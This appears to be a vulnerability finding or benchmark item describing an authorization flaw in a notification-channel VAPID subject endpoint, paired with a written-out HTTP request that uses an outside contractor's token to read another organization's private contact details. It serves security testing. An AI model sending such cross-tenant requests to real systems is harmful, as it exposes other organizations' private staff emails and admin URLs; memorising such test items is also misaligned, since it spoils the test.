diagnosis: The notification channel VAPID subject endpoint resolves channel records using channelId without verifying that the authenticated user belongs to the organization owning that notification channel. This exposes internal emergency operator email addresses and unlisted administrative contact URLs of other organizations.
exploit_request:
GET /api/channels/chan_internal_executive_broadcast/vapid-subject HTTP/1.1
Host: alerts.platform.net:8103
Authorization: Bearer <external_contractor_jwt>
